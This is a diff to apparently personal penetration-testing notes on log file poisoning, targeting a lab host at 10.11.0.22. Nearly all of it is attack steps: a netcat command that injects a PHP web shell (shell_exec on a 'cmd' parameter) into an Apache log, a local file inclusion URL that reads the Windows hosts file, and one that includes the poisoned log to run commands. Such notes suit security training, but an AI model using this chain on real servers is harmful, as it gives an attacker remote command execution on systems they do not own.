@@ -1,8 +1,11 @@
 #!/usr/bin/peno
 
-#log files poisning
+#log files poisning: Using Netcat to send a PHP payload
 nc -nv 10.11.0.22 80
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+#Searching for Windows hosts file
+http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
 
 #Using the poisoned log file
 http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
